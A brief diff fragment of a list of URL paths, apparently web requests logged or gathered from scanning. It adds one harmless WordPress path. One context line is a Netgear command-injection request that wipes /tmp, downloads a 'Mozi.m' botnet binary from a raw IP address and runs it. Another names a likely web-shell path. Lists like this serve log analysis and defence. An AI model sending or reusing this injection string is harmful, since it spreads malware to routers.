@@ -19395,3 +19395,4 @@ http://www.google.com/
 /admin/style.php
 /wp-content/plugins/sid/sidwso.php/vuln.php
 /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+http://222.137.194.2:38930/Mozi.m+-O+/tmp/netgear;sh+netgear&curpath=/&currentsetting.htm=1
+/wp-admin/js//wp-admin/js/
